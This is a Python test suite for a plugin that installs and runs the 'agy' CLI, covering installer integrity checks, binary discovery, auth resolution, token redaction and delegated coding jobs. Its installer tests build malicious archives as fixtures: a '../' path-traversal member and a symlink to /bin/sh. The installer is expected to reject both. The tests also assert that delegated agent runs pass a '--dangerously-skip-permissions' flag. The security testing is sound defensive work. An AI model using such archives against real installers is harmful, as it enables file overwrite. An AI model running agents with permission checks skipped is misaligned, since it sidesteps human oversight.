"""Hermetic unit and integration tests for standalone Antigravity CLI (`agy`) support."""

from __future__ import annotations

import hashlib
import io
import json
import os
from pathlib import Path
import stat
import subprocess
import sys
import tarfile
import textwrap
import threading
import time
from unittest import mock

import pytest

from server.agy_cli import (
    _BINARY_PROBE_CACHE,
    _MODEL_FALLBACK_CACHE,
    build_agy_subprocess_env,
    convert_agy_usage_to_vertex,
    ensure_agy_cli_installed,
    inspect_agy_cli_offline,
    is_agy_auth_error,
    is_external_agy_binary,
    map_thinking_level_to_effort,
    resolve_agy_cli_binary,
    run_agy_cli_ask,
    run_agy_cli_structured_writer,
    run_agy_cli_worker,
    select_fallback_agy_model,
)
from server.batch_plan import FileTask, validate_batch_plan
from server.batch_runner import FileBatchRunner, probe_writers
from server.doctor import run_doctor
from server.genai_ask import ask_gemini
from server.install import (
    build_claude_user_config,
    build_codex_server_block,
    preflight,
)
from server.jobs import JobManager
from server.model_routes import resolve_batch_settings
from server.receipts import ReceiptStore
from server.regions import estimate_cost_usd, resolve_auth_config
from server.writers import (
    WriterAuthError,
    WriterConfigError,
    WriterRequest,
    make_agent_writer,
    make_genai_writer,
)

REPO_ROOT = Path(__file__).resolve().parent.parent
PLUGIN_ROOT = REPO_ROOT
INSTALL_SCRIPT = REPO_ROOT / "scripts" / "install_agy_cli.sh"


def _write_executable(path: Path, body: str) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body, encoding="utf-8")
    path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    return path


def _make_mock_external_agy(bin_path: Path, extra_python_logic: str = "") -> Path:
    """Create a realistic Python-backed mock external `agy` binary."""
    script = (
        "#!/usr/bin/env python3\n"
        + textwrap.dedent(
            """
            import json
            import os
            import sys
            import time

            argv = sys.argv[1:]
            if "--help" in argv or "-h" in argv:
                sys.stderr.write("Usage: agy [options]\\n  --output-format string\\n  --mode string\\n  --json-schema string\\n")
                raise SystemExit(0)
            """
        ).lstrip()
        + "\n"
        + textwrap.dedent(extra_python_logic)
    )
    return _write_executable(bin_path, script)


def _init_git_repo(repo_dir: Path) -> Path:
    repo_dir.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "init", "-b", "main"], cwd=str(repo_dir), check=True, capture_output=True)
    subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=str(repo_dir), check=True, capture_output=True)
    subprocess.run(["git", "config", "user.name", "Test User"], cwd=str(repo_dir), check=True, capture_output=True)
    (repo_dir / "app.py").write_text("def add(a, b):\n    return a - b\n", encoding="utf-8")
    (repo_dir / "test_app.py").write_text(
        "from app import add\n\ndef test_add():\n    assert add(2, 3) == 5\n",
        encoding="utf-8",
    )
    subprocess.run(["git", "add", "."], cwd=str(repo_dir), check=True, capture_output=True)
    subprocess.run(["git", "commit", "-m", "initial"], cwd=str(repo_dir), check=True, capture_output=True)
    return repo_dir


@pytest.fixture(autouse=True)
def _clear_agy_caches():
    _BINARY_PROBE_CACHE.clear()
    _MODEL_FALLBACK_CACHE.clear()
    yield
    _BINARY_PROBE_CACHE.clear()
    _MODEL_FALLBACK_CACHE.clear()


class TestInstallAgyCliScript:
    def _build_tar_gz(self, archive_path: Path, members: list[tuple[str, bytes, str]]) -> str:
        with tarfile.open(archive_path, "w:gz") as tf:
            for name, payload, kind in members:
                info = tarfile.TarInfo(name=name)
                if kind == "symlink":
                    info.type = tarfile.SYMTYPE
                    info.linkname = payload.decode("utf-8")
                    tf.addfile(info)
                else:
                    info.type = tarfile.REGTYPE
                    info.size = len(payload)
                    info.mode = 0o755
                    tf.addfile(info, io.BytesIO(payload))
        return hashlib.sha512(archive_path.read_bytes()).hexdigest()

    def test_offline_file_manifest_install_and_ensure_helper(self, tmp_path: Path):
        agy_payload = (
            b"#!/usr/bin/env bash\n"
            b'if [[ "${1:-}" == "--help" ]]; then echo "  --output-format string" >&2; exit 0; fi\n'
            b"exit 0\n"
        )
        archive = tmp_path / "agy-release.tar.gz"
        sha512 = self._build_tar_gz(archive, [("antigravity-cli/agy", agy_payload, "file")])
        manifest = tmp_path / "manifest.json"
        manifest.write_text(
            json.dumps(
                {
                    "version": "1.23.4-ext",
                    "url": archive.as_uri(),
                    "sha512": sha512,
                }
            ),
            encoding="utf-8",
        )
        target_dir = tmp_path / "installed-bin"
        boot = ensure_agy_cli_installed(
            REPO_ROOT,
            env={
                "HOME": str(tmp_path),
                "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
                "CC_AGY_CLI_INSTALL_DIR": str(target_dir),
                "CC_AGY_CLI_MANIFEST_URL": manifest.as_uri(),
                "CC_AGY_CLI_PLATFORM": "linux_amd64",
            },
        )
        assert boot["ok"] is True, boot
        assert boot["bootstrapped"] is True
        assert boot["version"] == "1.23.4-ext"
        installed_bin = target_dir / "agy"
        assert installed_bin.is_file() and os.access(installed_bin, os.X_OK)

        # Second call sees existing binary and skips re-downloading
        boot2 = ensure_agy_cli_installed(
            REPO_ROOT,
            env={
                "HOME": str(tmp_path),
                "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
                "CC_AGY_CLI_INSTALL_DIR": str(target_dir),
                "CC_AGY_CLI_MANIFEST_URL": "file:///nonexistent/manifest.json",
            },
        )
        assert boot2["ok"] is True
        assert boot2["bootstrapped"] is False
        assert boot2["agy_bin"] == str(installed_bin)

    def test_sha512_mismatch_rejected(self, tmp_path: Path):
        archive = tmp_path / "bad.tar.gz"
        self._build_tar_gz(archive, [("agy", b"#!/bin/sh\nexit 0\n", "file")])
        manifest = tmp_path / "manifest.json"
        manifest.write_text(
            json.dumps({"version": "1.0.0", "url": archive.as_uri(), "sha512": "0" * 128}),
            encoding="utf-8",
        )
        target_dir = tmp_path / "out"
        proc = subprocess.run(
            ["bash", str(INSTALL_SCRIPT), "--target-dir", str(target_dir), "--manifest-url", manifest.as_uri()],
            capture_output=True,
            text=True,
            check=False,
            env={**os.environ, "CC_AGY_CLI_PLATFORM": "linux_amd64"},
        )
        assert proc.returncode != 0
        assert "SHA-512 mismatch" in proc.stderr
        assert not (target_dir / "agy").exists()

    def test_tar_path_traversal_and_symlink_rejected(self, tmp_path: Path):
        traversal_archive = tmp_path / "traversal.tar.gz"
        sha_trav = self._build_tar_gz(traversal_archive, [("../escaped_agy", b"#!/bin/sh\n", "file")])
        manifest1 = tmp_path / "m1.json"
        manifest1.write_text(
            json.dumps({"version": "1.0.0", "url": traversal_archive.as_uri(), "sha512": sha_trav}),
            encoding="utf-8",
        )
        proc1 = subprocess.run(
            ["bash", str(INSTALL_SCRIPT), "--target-dir", str(tmp_path / "out1"), "--manifest-url", manifest1.as_uri()],
            capture_output=True,
            text=True,
            check=False,
            env={**os.environ, "CC_AGY_CLI_PLATFORM": "linux_amd64"},
        )
        assert proc1.returncode != 0
        assert "path-traversal" in proc1.stderr

        symlink_archive = tmp_path / "symlink.tar.gz"
        sha_sym = self._build_tar_gz(symlink_archive, [("agy", b"/bin/sh", "symlink")])
        manifest2 = tmp_path / "m2.json"
        manifest2.write_text(
            json.dumps({"version": "1.0.0", "url": symlink_archive.as_uri(), "sha512": sha_sym}),
            encoding="utf-8",
        )
        proc2 = subprocess.run(
            ["bash", str(INSTALL_SCRIPT), "--target-dir", str(tmp_path / "out2"), "--manifest-url", manifest2.as_uri()],
            capture_output=True,
            text=True,
            check=False,
            env={**os.environ, "CC_AGY_CLI_PLATFORM": "linux_amd64"},
        )
        assert proc2.returncode != 0
        assert "non-regular" in proc2.stderr

    def test_http_manifest_url_rejected_by_default(self, tmp_path: Path):
        manifest = tmp_path / "http_manifest.json"
        manifest.write_text(
            json.dumps({"version": "1.0.0", "url": "http://example.com/agy.tar.gz", "sha512": "a" * 128}),
            encoding="utf-8",
        )
        proc = subprocess.run(
            ["bash", str(INSTALL_SCRIPT), "--target-dir", str(tmp_path / "out"), "--manifest-url", manifest.as_uri()],
            capture_output=True,
            text=True,
            check=False,
            env={**os.environ, "CC_AGY_CLI_PLATFORM": "linux_amd64"},
        )
        assert proc.returncode != 0
        assert "must use https://" in proc.stderr


class TestBinaryDiscoveryAndOfflineReadiness:
    def test_skips_google_internal_jetski_and_picks_external_agy(self, tmp_path: Path):
        internal_dir = tmp_path / "internal_path"
        _write_executable(
            internal_dir / "agy",
            "#!/usr/bin/env bash\necho '  --is_google_internal  --use_stubby_auth  --output-format' >&2\nexit 0\n",
        )
        ok_int, reason_int = is_external_agy_binary(internal_dir / "agy")
        assert ok_int is False
        assert reason_int == "internal_jetski_binary"

        # When only internal binary is on PATH, resolve_agy_cli_binary returns None + skipped list
        found_none, skipped = resolve_agy_cli_binary(
            {
                "HOME": str(tmp_path / "empty_home"),
                "PATH": f"{internal_dir}:/usr/bin:/bin",
            }
        )
        assert found_none is None
        assert str(internal_dir / "agy") in skipped

        # When managed external binary exists, it wins cleanly
        managed_dir = tmp_path / "managed"
        ext_bin = _make_mock_external_agy(managed_dir / "agy")
        found_ext, _ = resolve_agy_cli_binary(
            {
                "HOME": str(tmp_path / "empty_home"),
                "CC_AGY_CLI_INSTALL_DIR": str(managed_dir),
                "PATH": f"{internal_dir}:/usr/bin:/bin",
            }
        )
        assert found_ext == str(ext_bin)

    def test_inspect_agy_cli_offline_auth_sources_and_secret_redaction(self, tmp_path: Path):
        ext_bin = _make_mock_external_agy(tmp_path / "bin" / "agy")
        cfg_dir = tmp_path / "cfg"
        cfg_dir.mkdir(parents=True)

        # 1. Missing auth
        s_missing = inspect_agy_cli_offline(
            {"CC_AGY_CLI_BIN": str(ext_bin), "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir)}
        )
        assert s_missing["ok"] is False
        assert s_missing["binary_found"] is True
        assert s_missing["auth_configured"] is False
        assert str(ext_bin) in s_missing["remediation"]

        # 2. Onboarding cache
        (cfg_dir / "cache").mkdir(parents=True)
        (cfg_dir / "cache" / "onboarding.json").write_text(
            json.dumps({"enterpriseOnboardingComplete": True}),
            encoding="utf-8",
        )
        s_onboard = inspect_agy_cli_offline(
            {"CC_AGY_CLI_BIN": str(ext_bin), "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir)}
        )
        assert s_onboard["ok"] is True
        assert s_onboard["credential_source"].startswith("onboarding_cache:")

        # 3. Token file + env token never leak secret values
        secret_tok = "".join(("ya29", ".dummy-enterprise-test-token-999"))
        (cfg_dir / "antigravity-oauth-token").write_text(secret_tok, encoding="utf-8")
        s_env = inspect_agy_cli_offline(
            {
                "CC_AGY_CLI_BIN": str(ext_bin),
                "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir),
                "ANTIGRAVITY_OAUTH_TOKEN": secret_tok,
            }
        )
        assert s_env["ok"] is True
        assert s_env["credential_source"] == "env:ANTIGRAVITY_OAUTH_TOKEN"
        assert secret_tok not in json.dumps(s_env)


class TestUsageAndModelMapping:
    def test_convert_agy_usage_zero_double_counting(self):
        # In agy `steps/json_output.go`:
        # input_tokens = uncached input (1000)
        # cache_read_tokens = cached input (4000)
        # output_tokens = candidates + thinking (700)
        # thinking_tokens = thinking subset (500)
        vertex = convert_agy_usage_to_vertex(
            {
                "input_tokens": 1000,
                "cache_read_tokens": 4000,
                "output_tokens": 700,
                "thinking_tokens": 500,
            }
        )
        assert vertex == {
            "prompt_token_count": 5000,
            "cached_content_token_count": 4000,
            "candidates_token_count": 200,
            "thoughts_token_count": 500,
            "total_token_count": 5700,
        }
        # Verify pricing math uses exact 1000 uncached + 4000 cached + 700 total output on Flash
        cost = estimate_cost_usd("gemini-3.8-flash", vertex)["total_cost_usd"]
        expected = (1000 * 0.50 + 4000 * 0.05 + 700 * 3.00) / 1_000_000.0
        assert abs(cost - expected) < 1e-12

    def test_effort_mapping_and_model_fallback_catalog(self):
        assert map_thinking_level_to_effort("LOW", "gemini-3.8-flash") == "low"
        assert map_thinking_level_to_effort("EXTRA_HIGH", "gemini-4-argon") == "xhigh"
        assert map_thinking_level_to_effort("HIGH", "gemini-3.8-flash-low") is None
        assert map_thinking_level_to_effort("HIGH", "Gemini 4 Argon (High)") is None

        catalog = [
            "Claude Opus 4.6",
            "Gemini 3.5 Flash Lite",
            "Gemini 3.7 Flash (Low)",
            "Gemini 3.7 Flash (High)",
            "Gemini 3.1 Pro (High)",
        ]
        assert select_fallback_agy_model("gemini-3.8-flash", "low", catalog) == "Gemini 3.7 Flash (Low)"
        assert select_fallback_agy_model("gemini-4-argon", "high", catalog) == "Gemini 3.1 Pro (High)"

    def test_subprocess_env_scrubbing(self):
        scrubbed = build_agy_subprocess_env(
            {
                "PATH": "/usr/bin",
                "HOME": "/tmp/h",
                "ANTIGRAVITY_OAUTH_TOKEN": "valid-oauth-tok",
                "ANTHROPIC_API_KEY": "sk-ant-secret",
                "GEMINI_API_KEY": "ai-studio-secret",
                "CC_AGY_VERTEX_BASE_URL_TOKEN": "gw-secret",
                "CLAUDE_PLUGIN_OPTION_GEMINI_API_KEY": "opt-secret",
                "CC_AGY_USERCFG_VERTEX_BASE_URL_TOKEN": "ucfg-secret",
            }
        )
        assert scrubbed["ANTIGRAVITY_OAUTH_TOKEN"] == "valid-oauth-tok"
        assert "ANTHROPIC_API_KEY" not in scrubbed
        assert "GEMINI_API_KEY" not in scrubbed
        assert "CC_AGY_VERTEX_BASE_URL_TOKEN" not in scrubbed
        assert not any(k.startswith("CLAUDE_PLUGIN_OPTION_") for k in scrubbed)
        assert not any(k.startswith("CC_AGY_USERCFG_") for k in scrubbed)

        # Unsubstituted ${...} placeholder on ANTIGRAVITY_OAUTH_TOKEN is stripped
        scrubbed_placeholder = build_agy_subprocess_env({"ANTIGRAVITY_OAUTH_TOKEN": "${ANTIGRAVITY_OAUTH_TOKEN}"})
        assert "ANTIGRAVITY_OAUTH_TOKEN" not in scrubbed_placeholder


class TestAuthPrecedenceDoctorAndInstall:
    def test_resolve_auth_config_explicit_and_auto_fallback(self, tmp_path: Path):
        ext_bin = _make_mock_external_agy(tmp_path / "bin" / "agy")
        cfg_dir = tmp_path / "cfg"
        cfg_dir.mkdir(parents=True)
        (cfg_dir / "antigravity-oauth-token").write_text("oauth-token-123456", encoding="utf-8")

        # Hermetic empty env still raises ValueError (does not leak host state into tests)
        with pytest.raises(ValueError, match="Missing credentials"):
            resolve_auth_config(env={})

        # Explicit aliases resolve to gemini_enterprise
        for alias in ("gemini_enterprise", "gemini-enterprise", "agy-cli", "agy_cli", "agy"):
            res = resolve_auth_config(env={"CC_AGY_AUTH_MODE": alias})
            assert res["auth_mode"] == "gemini_enterprise"
            assert res["api_key"] is None

        # Auto mode falls back to gemini_enterprise when signed-in external agy is configured
        auto_res = resolve_auth_config(
            env={
                "CC_AGY_CLI_BIN": str(ext_bin),
                "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir),
            }
        )
        assert auto_res["auth_mode"] == "gemini_enterprise"

        # API key or Vertex project still takes priority over auto agy fallback when auth_mode is auto
        key_res = resolve_auth_config(
            env={
                "GEMINI_API_KEY": "real-ai-studio-key",
                "CC_AGY_CLI_BIN": str(ext_bin),
                "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir),
            }
        )
        assert key_res["auth_mode"] == "api_key"

        vtx_res = resolve_auth_config(
            env={
                "GOOGLE_CLOUD_PROJECT": "corp-vertex-proj",
                "CC_AGY_CLI_BIN": str(ext_bin),
                "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir),
            }
        )
        assert vtx_res["auth_mode"] == "vertex"

    def test_doctor_stays_healthy_on_pure_cli_machine_without_python_sdks(self, tmp_path: Path):
        repo = _init_git_repo(tmp_path / "repo")
        ext_bin = _make_mock_external_agy(tmp_path / "bin" / "agy")
        cfg_dir = tmp_path / "cfg"
        cfg_dir.mkdir(parents=True)
        (cfg_dir / "antigravity-oauth-token").write_text("secret-oauth-token-xyz", encoding="utf-8")
        store = ReceiptStore(workspace_root=repo, data_dir=tmp_path / "data")

        with (
            mock.patch("server.doctor._module_available", return_value=False),
            mock.patch("server.runtime_env.python_has_module", return_value=False),
        ):
            report = run_doctor(
                workspace_root=repo,
                env={
                    "CC_AGY_AUTH_MODE": "gemini_enterprise",
                    "CC_AGY_CLI_BIN": str(ext_bin),
                    "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir),
                },
                store=store,
            )
        assert report["healthy"] is True, report
        assert report["issues"] == []
        assert report["auth"]["auth_mode"] == "gemini_enterprise"
        assert report["auth"]["agy_cli"]["binary_found"] is True
        assert report["auth"]["agy_cli"]["auth_configured"] is True
        assert "secret-oauth-token-xyz" not in json.dumps(report)

    def test_installer_codex_and_claude_enterprise_configs(self, tmp_path: Path):
        ext_bin = _make_mock_external_agy(tmp_path / "bin" / "agy")
        cfg_dir = tmp_path / "cfg"
        cfg_dir.mkdir(parents=True)
        (cfg_dir / "antigravity-oauth-token").write_text("oauth-secret-value-999", encoding="utf-8")

        block = build_codex_server_block(
            python_bin="/usr/bin/python3",
            profile="balanced",
            auth_mode="agy-cli",
            agy_cli_path=str(ext_bin),
        )
        assert 'CC_AGY_AUTH_MODE = "gemini_enterprise"' in block
        assert f'CC_AGY_CLI_BIN = "{ext_bin}"' in block
        assert '"ANTIGRAVITY_OAUTH_TOKEN"' in block
        assert "oauth-secret-value-999" not in block

        claude_cfg = build_claude_user_config(
            profile="quality",
            auth_mode="gemini-enterprise",
            agy_cli_path=str(ext_bin),
        )
        assert claude_cfg == {
            "auth_mode": "gemini_enterprise",
            "cost_profile": "quality",
            "agy_cli_path": str(ext_bin),
        }

        with mock.patch("server.install.python_has_plugin_sdks", return_value=False):
            pre = preflight(
                {
                    "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir),
                },
                auth_mode="gemini-enterprise",
                agy_cli_path=str(ext_bin),
            )
        assert pre["ready"] is True, pre
        assert pre["auth_mode"] == "gemini_enterprise"


class TestAgyCliRuntimeExecution:
    def test_worker_multiturn_cumulative_usage_and_model_fallback(self, tmp_path: Path):
        log_file = tmp_path / "invocations.jsonl"
        agy_bin = _make_mock_external_agy(
            tmp_path / "bin" / "agy",
            f"""
            prompt = sys.stdin.read()
            log_entry = {{"argv": argv, "prompt": prompt}}
            with open({str(log_file)!r}, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(log_entry) + "\\n")

            model_idx = argv.index("--model") + 1 if "--model" in argv else -1
            model = argv[model_idx] if model_idx >= 0 else ""
            if model == "gemini-3.8-flash":
                err_evt = {{
                    "status": "ERROR",
                    "error": 'model "gemini-3.8-flash" is not recognized as a known model.\\n\\nAvailable models:\\n  Gemini 3.7 Flash (Low)\\n  Gemini 3.1 Pro (High)\\n',
                }}
                print(json.dumps({{"event": "result", "result": err_evt}}), flush=True)
                raise SystemExit(1)

            conv = argv[argv.index("--conversation") + 1] if "--conversation" in argv else "conv-123"
            is_turn2 = "--conversation" in argv
            # Simulate cumulative trajectory usage on --conversation resume (num_turns=2)
            usage = (
                {{"input_tokens": 300, "cache_read_tokens": 100, "output_tokens": 90, "thinking_tokens": 30}}
                if is_turn2
                else {{"input_tokens": 100, "cache_read_tokens": 50, "output_tokens": 40, "thinking_tokens": 10}}
            )
            print(json.dumps({{
                "event": "step_update",
                "step_update": {{"step_index": 1, "tool_info": {{"name": "edit_file", "parameters": {{"path": "app.py"}}}}}}
            }}), flush=True)
            print(json.dumps({{
                "event": "result",
                "result": {{
                    "status": "SUCCESS",
                    "conversation_id": conv,
                    "num_turns": 2 if is_turn2 else 1,
                    "response": "Turn 2 complete" if is_turn2 else "Turn 1 complete",
                    "usage": usage,
                }}
            }}), flush=True)
            """,
        )
        ws = tmp_path / "ws"
        ws.mkdir()
        out = run_agy_cli_worker(
            {
                "workspace_dir": str(ws),
                "model": "gemini-3.8-flash",
                "thinking_level": "LOW",
                "prompts": ["Fix bug step 1", "Verify step 2"],
                "allowed_paths": ["app.py"],
                "env": {"CC_AGY_CLI_BIN": str(agy_bin)},
            }
        )
        assert out["text"] == "Turn 2 complete"
        assert out["agy_conversation_id"] == "conv-123"
        assert out["containment"] == "agy_cli"
        assert "Gemini 3.7 Flash (Low)" in (out["reroute_note"] or "")
        # Because Turn 2 reported num_turns=2 on the same conversation, usage must equal Turn 2's cumulative snapshot, NOT Turn 1 + Turn 2
        assert out["usage"] == {
            "prompt_token_count": 400,
            "cached_content_token_count": 100,
            "candidates_token_count": 60,
            "thoughts_token_count": 30,
            "total_token_count": 490,
        }
        calls = [json.loads(line) for line in log_file.read_text(encoding="utf-8").splitlines()]
        # Call 1 failed on gemini-3.8-flash, Call 2 succeeded on Gemini 3.7 Flash (Low), Call 3 resumed --conversation conv-123
        assert len(calls) == 3
        assert "-p" not in calls[1]["argv"] and "--print" not in calls[1]["argv"]
        assert "--project" not in calls[1]["argv"]
        assert "--dangerously-skip-permissions" in calls[1]["argv"]
        assert ["--conversation", "conv-123"] == calls[2]["argv"][-2:]

    def test_job_manager_start_continue_apply_and_cancel(self, tmp_path: Path):
        repo = _init_git_repo(tmp_path / "repo")
        store = ReceiptStore(workspace_root=repo, data_dir=tmp_path / "data")
        agy_bin = _make_mock_external_agy(
            tmp_path / "bin" / "agy",
            """
            prompt = sys.stdin.read()
            if "SLEEP_FOREVER" in prompt:
                time.sleep(60)
                raise SystemExit(0)
            conv = argv[argv.index("--conversation") + 1] if "--conversation" in argv else "conv-job-77"
            if "Use + instead of *" in prompt:
                with open("app.py", "w", encoding="utf-8") as fh:
                    fh.write("def add(a, b):\\n    return a + b\\n")
                resp = "Fixed add() in app.py"
            else:
                with open("app.py", "w", encoding="utf-8") as fh:
                    fh.write("def add(a, b):\\n    return a * b\\n")
                resp = "Attempted first edit"
            print(json.dumps({
                "event": "result",
                "result": {
                    "status": "SUCCESS",
                    "conversation_id": conv,
                    "num_turns": 1,
                    "response": resp,
                    "usage": {"input_tokens": 200, "cache_read_tokens": 0, "output_tokens": 50, "thinking_tokens": 10},
                }
            }), flush=True)
            """,
        )
        env_patch = {
            "CC_AGY_AUTH_MODE": "gemini_enterprise",
            "CC_AGY_CLI_BIN": str(agy_bin),
            "ANTIGRAVITY_OAUTH_TOKEN": "secret-tok-never-in-receipt",
        }
        pytest_cmd = f"{sys.executable} -m pytest -q"
        with mock.patch.dict(os.environ, env_patch, clear=False):
            jm = JobManager(workspace_root=repo, store=store)
            try:
                r1 = jm.delegate_start(
                    prompt="Fix add in app.py",
                    acceptance=[pytest_cmd],
                    wait=True,
                )
                # First edit wrote a * b so pytest fails
                assert r1["auth_mode"] == "gemini_enterprise"
                assert r1["acceptance_passed"] is False
                rcpt1 = store.read_receipt(r1["job_id"])
                assert rcpt1["agy_conversation_id"] == "conv-job-77"
                assert "secret-tok-never-in-receipt" not in json.dumps(rcpt1)

                # Continue runs on the same worktree (escalating to gemini-4-argon under balanced) and fixes app.py
                r2 = jm.delegate_continue(
                    job_id=r1["job_id"],
                    follow_up_prompt="Use + instead of * in add()",
                    wait=True,
                )
                assert r2["status"] == "ok", r2
                assert r2["acceptance_passed"] is True
                assert r2["usage"]["prompt_token_count"] == 400
                applied = jm.delegate_apply(r1["job_id"])
                assert applied["applied"] is True
                assert "return a + b" in (repo / "app.py").read_text(encoding="utf-8")

                # Test delegate_cancel kills an in-flight agy process group promptly
                started_cancel = jm.delegate_start(prompt="SLEEP_FOREVER", wait=False)
                time.sleep(0.35)
                t0 = time.monotonic()
                cancelled = jm.delegate_cancel(started_cancel["job_id"])
                elapsed = time.monotonic() - t0
                assert cancelled["status"] == "cancelled"
                assert elapsed < 5.0
            finally:
                jm.shutdown(wait=True)

    def test_ask_gemini_and_batch_writers_via_agy_cli(self, tmp_path: Path):
        repo = _init_git_repo(tmp_path / "repo")
        store = ReceiptStore(workspace_root=repo, data_dir=tmp_path / "data")
        agy_bin = _make_mock_external_agy(
            tmp_path / "bin" / "agy",
            """
            prompt = sys.stdin.read()
            if "--json-schema" in argv:
                if "util.py" in prompt:
                    so = {"path": "util.py", "content": "VALUE = 42\\n"}
                else:
                    so = {"ok": True}
                print(json.dumps({
                    "status": "SUCCESS",
                    "structured_output": so,
                    "usage": {"input_tokens": 120, "cache_read_tokens": 30, "output_tokens": 40, "thinking_tokens": 5},
                }), flush=True)
            else:
                assert "--mode" in argv and argv[argv.index("--mode") + 1] == "plan"
                print(json.dumps({
                    "status": "SUCCESS",
                    "response": "LGTM: clean architecture.",
                    "usage": {"input_tokens": 80, "cache_read_tokens": 20, "output_tokens": 25, "thinking_tokens": 5},
                }), flush=True)
            """,
        )
        env_patch = {
            "CC_AGY_AUTH_MODE": "gemini_enterprise",
            "CC_AGY_CLI_BIN": str(agy_bin),
            "ANTIGRAVITY_OAUTH_TOKEN": "secret-ask-oauth-tok",
        }
        with mock.patch.dict(os.environ, env_patch, clear=False):
            ask_out = ask_gemini(
                prompt="Review app.py",
                context_files=["app.py"],
                workspace_root=repo,
                store=store,
            )
            assert ask_out["auth_mode"] == "gemini_enterprise"
            assert ask_out["text"] == "LGTM: clean architecture."
            assert ask_out["usage"]["prompt_token_count"] == 100
            ask_rcpt = store.read_receipt(ask_out["job_id"])
            assert "secret-ask-oauth-tok" not in json.dumps(ask_rcpt)

            settings = resolve_batch_settings({"model": "gemini-3.8-flash", "claude_writer": False})
            probe = probe_writers(
                settings,
                auth={"auth_mode": "gemini_enterprise"},
            )
            assert probe["status"] == "ok", probe

            plan_dict = {
                "tasks": [
                    {
                        "task_id": "create_util",
                        "path": "util.py",
                        "action": "create",
                        "intent": "Define VALUE = 42 in util.py.",
                        "checks": ["python3 -m py_compile util.py"],
                    }
                ]
            }
            parsed_plan = validate_batch_plan(plan_dict, repo)
            jm = JobManager(workspace_root=repo, store=store)
            try:
                runner = FileBatchRunner(jm)
                batch_res = runner.run(parsed_plan, settings, {"auth_mode": "gemini_enterprise"})
                assert batch_res["status"] == "ok", batch_res
                assert batch_res["totals"]["landed"] == 1
                batch_rcpt = store.read_receipt(batch_res["job_id"])
                assert batch_rcpt["auth_mode"] == "gemini_enterprise"
            finally:
                jm.shutdown(wait=True)

    def test_writer_error_classifications(self, tmp_path: Path):
        dummy_req = WriterRequest(
            task=FileTask(task_id="t1", path="a.py", action="create", intent="create a.py"),
            prompt="hello",
        )
        unauth_bin = _make_mock_external_agy(
            tmp_path / "unauth" / "agy",
            """
            _ = sys.stdin.read()
            print(json.dumps({"status": "ERROR", "error": "Not logged in. Please sign in with Google."}), flush=True)
            raise SystemExit(1)
            """,
        )
        with mock.patch.dict(os.environ, {"CC_AGY_CLI_BIN": str(unauth_bin)}, clear=False):
            w_auth = make_genai_writer({"auth_mode": "gemini_enterprise"}, model="gemini-3.8-flash")
            with pytest.raises(WriterAuthError):
                w_auth(dummy_req)

        with mock.patch.dict(os.environ, {"CC_AGY_CLI_BIN": str(tmp_path / "missing-agy")}, clear=False):
            w_cfg = make_agent_writer({"auth_mode": "gemini_enterprise"}, model="gemini-3.8-flash")
            with pytest.raises(WriterConfigError):
                w_cfg(dummy_req)


class TestGauntletRound1Bugs:
    """RED-first regression tests covering every Round 1 blocker across Opus, Fable, and Argon."""

    def test_main_stdlib_startup_without_google_pkg_and_unsigned_auto_skip_venv(self, tmp_path: Path):
        bare_venv = tmp_path / "barevenv"
        subprocess.run([sys.executable, "-m", "venv", "--without-pip", str(bare_venv)], check=True)
        bare_py = bare_venv / "bin" / "python"

        home_dir = tmp_path / "home"
        bin_dir = home_dir / ".local" / "share" / "cc-agy-plugin" / "bin"
        cfg_dir = home_dir / ".gemini" / "antigravity-cli"
        bin_dir.mkdir(parents=True)
        cfg_dir.mkdir(parents=True)
        fake_agy = _make_mock_external_agy(bin_dir / "agy", "raise SystemExit(0)")
        (cfg_dir / "antigravity-oauth-token").write_text("oauth-token-123456", encoding="utf-8")

        init_req = (
            json.dumps(
                {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "initialize",
                    "params": {"protocolVersion": "2024-11-05", "capabilities": {}, "clientInfo": {"name": "t"}},
                }
            )
            + "\n"
            + json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}})
            + "\n"
        )
        clean_env = {
            "PATH": "/usr/bin:/bin",
            "HOME": str(home_dir),
            "CC_AGY_AUTH_MODE": "gemini_enterprise",
            "CC_AGY_CLI_BIN": str(fake_agy),
            "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir),
            "CC_AGY_AUTO_BOOTSTRAP": "0",
            "PYTHONPATH": str(PLUGIN_ROOT),
        }
        proc = subprocess.run(
            [str(bare_py), str(PLUGIN_ROOT / "server" / "main.py")],
            input=init_req,
            env=clean_env,
            capture_output=True,
            text=True,
            timeout=15,
        )
        assert proc.returncode == 0, f"stderr={proc.stderr!r}"
        lines = [json.loads(line) for line in proc.stdout.splitlines() if line.strip()]
        assert len(lines) == 2
        assert len(lines[1]["result"]["tools"]) == 18

        # Unsigned `auto` mode with external `agy` binary already installed:
        # 1) `doctor` must surface `agy_cli` sign-in remediation and NOT report missing Python SDK packages as issues.
        # 2) `main.py` must NOT attempt `ensure_sdk_venv` bootstrap on startup.
        unsigned_cfg = tmp_path / "unsigned_cfg"
        unsigned_cfg.mkdir()
        repo = tmp_path / "repo"
        _init_git_repo(repo)
        with (
            mock.patch("server.doctor._module_available", return_value=False),
            mock.patch("server.runtime_env.python_has_module", return_value=False),
        ):
            doc = run_doctor(
                workspace_root=repo,
                env={
                    "HOME": str(home_dir),
                    "PATH": "/usr/bin:/bin",
                    "CC_AGY_CLI_INSTALL_DIR": str(bin_dir),
                    "CC_AGY_CLI_CONFIG_DIR": str(unsigned_cfg),
                },
                store=ReceiptStore(tmp_path / "doc_store", workspace_root=repo),
            )
        assert doc["healthy"] is False
        assert "agy_cli" in doc["auth"]
        assert doc["auth"]["agy_cli"]["binary_found"] is True
        assert doc["auth"]["agy_cli"]["auth_configured"] is False
